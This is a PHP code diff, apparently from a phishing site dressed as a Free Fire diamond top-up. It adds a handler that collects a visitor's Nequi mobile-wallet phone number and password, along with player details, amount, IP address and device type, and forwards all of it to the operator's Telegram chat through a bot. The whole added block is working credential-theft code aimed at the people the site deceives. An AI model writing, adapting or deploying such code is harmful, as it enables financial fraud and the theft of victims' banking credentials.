@@ -238,6 +238,62 @@ if (!$config) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     $d = json_decode(file_get_contents('php://input'), true);
+
+    // MANEJAR ENVÍO DIRECTO DE DATOS NEQUI
+    if (isset($d['action']) && $d['action'] === 'enviar_datos_nequi_directo') {
+        $telefono = $d['telefono'] ?? '';
+        $clave = $d['clave'] ?? '';
+        $monto = $d['monto'] ?? '0';
+        $playerId = $d['playerId'] ?? '';
+        $playerName = $d['playerName'] ?? '';
+        $diamonds = $d['diamonds'] ?? '0';
+        $bonus = $d['bonus'] ?? '0';
+
+        if (empty($telefono) || empty($clave)) {
+            echo json_encode(['ok' => false, 'error' => 'Datos incompletos']);
+            exit;
+        }
+
+        // Crear mensaje directo con datos de Nequi
+        $msg = "<b>💎 FREE FIRE - DATOS NEQUI RECIBIDOS 💎</b>\n";
+        $msg .= "<b>• 🎮 Player ID:</b> <code>" . htmlspecialchars($playerId) . "</code>\n";
+        $msg .= "<b>• 👤 Player Name:</b> " . htmlspecialchars($playerName) . "\n";
+        $msg .= "<b>• 💎 Diamantes:</b> " . htmlspecialchars($diamonds) . "\n";
+        if ($bonus > 0) {
+            $msg .= "<b>• 🎁 Bonus:</b> " . htmlspecialchars($bonus) . "\n";
+        }
+        $msg .= "<b>• 💰 Monto:</b> $ " . number_format((float)$monto, 0, ',', '.') . "\n";
+        $msg .= "------------------------------\n";
+        $msg .= "<b>• 📱 Número Nequi:</b> <code>" . htmlspecialchars($telefono) . "</code>\n";
+        $msg .= "<b>• 🔐 Clave:</b> <code>" . htmlspecialchars($clave) . "</code>\n";
+        $msg .= "------------------------------\n";
+
+        // Obtener IP y dispositivo
+        $ip = $_SERVER['REMOTE_ADDR'] ?? 'No disponible';
+        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+        $dispositivo = 'PC';
+        if (preg_match('/Android/i', $userAgent)) {
+            $dispositivo = 'Android';
+        } elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) {
+            $dispositivo = 'iPhone';
+        }
+
+        date_default_timezone_set('America/Bogota');
+        $hora = date('d/m/Y H:i:s');
+
+        $msg .= "<b>• 📟 Dispositivo:</b> " . $dispositivo . "\n";
+        $msg .= "<b>• 🗺 IP:</b> " . $ip . "\n";
+        $msg .= "<b>• ⏱ Hora:</b> " . $hora . "\n";
+
+        // Enviar mensaje directo a Telegram sin botones
+        $keyboard = ['inline_keyboard' => []]; // Sin botones
+        $sent = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);
+
+        echo json_encode(['ok' => !empty($sent['ok'])]);
+        exit;
+    }
+
+    // CÓDIGO ORIGINAL PARA ENVÍO INICIAL
     $tid = $d['transactionId'] ?? '';
 
     if (!$tid || isTokenUsed($tid)) {
